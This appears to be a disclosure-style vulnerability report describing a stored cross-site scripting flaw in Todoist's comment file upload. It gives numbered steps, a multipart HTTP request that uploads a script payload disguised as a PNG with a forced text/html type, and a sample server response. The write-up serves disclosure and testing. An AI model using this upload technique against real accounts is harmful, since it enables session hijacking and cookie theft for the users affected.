# Todoist-XSSv9541

# Stored XSS in Todoist via Malicious PNG Upload with Forced Content-Type: text/html

## Short Title
Stored XSS in Todoist via Malicious PNG Upload with Forced Content-Type: text/html

## Affected Product
Todoist Web Application — https://app.todoist.com (comment / upload functionality)

## Summary
When PNG files uploaded to Todoist comments are sent with the Content-Type header set to `text/html`, the uploaded file content may be processed as HTML/JavaScript causing a Stored Cross-Site Scripting (XSS) vulnerability. This can lead to session hijacking, theft of cookies, or unauthorized actions performed on behalf of users.

## Proof of Concept (PoC) — High-Level Steps
> Note: Before publishing any exploit code publicly, it is recommended to coordinate disclosure with the vendor.

1. Prepare a payload containing malicious HTML/JavaScript:
   - Example payload: `<script>alert('XSS by BRT')</script>`
   - Save the content to a file and change the extension to `.png` (e.g., `malicious.png`).

2. Send the file with multipart/form-data to the upload endpoint (e.g., POST /asl/v1/uploads or /api/v1/uploads). Crucially, set the form-data part's `Content-Type` to `text/html`.

3. The server accepts the file and returns a URL (for example on CloudFront or files.todoist.com).

4. When the uploaded file is embedded in a comment or the returned URL is opened in a browser, the JavaScript executes (Stored XSS).

## Example HTTP Request (PoC format)

![1](https://github.com/user-attachments/assets/a1d93d48-74a2-4f16-bb11-28f953121718)


```![2](https://github.com/user-attachments/assets/7a3f0b3a-f834-4746-9eef-da855526d07b)

POST /asl/v1/uploads HTTP/2
Host: app.todoist.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="file"; filename="malicious.png"
Content-Type: text/html

<script>alert('XSS by BRT')</script>
------WebKitFormBoundary...
```

Example partial server response (JSON):

```![2](https://github.com/user-attachments/assets/69b00011-7975-4a1f-830d-a9ede4c23746)

{![3](https://github.com/user-attachments/assets/09adcc50-d018-4bb9-ab80-39184799d74e)

  "file_name": "pngtoxss.png",
  "file_size": 11803,
  "file_type": "text/html",
  "image": "https://.../as/file.png",
  "resource_type": "image"
}
```
![3](https://github.com/user-attachments/assets/d2d4071d-414b-4fd0-b5a5-7a5b4e6f5664)

## Impact
- Stored XSS → session hijacking, cookie theft
- Displaying malicious content to users (phishing-like attacks)
- Unauthorized in-application actions via injected JavaScript
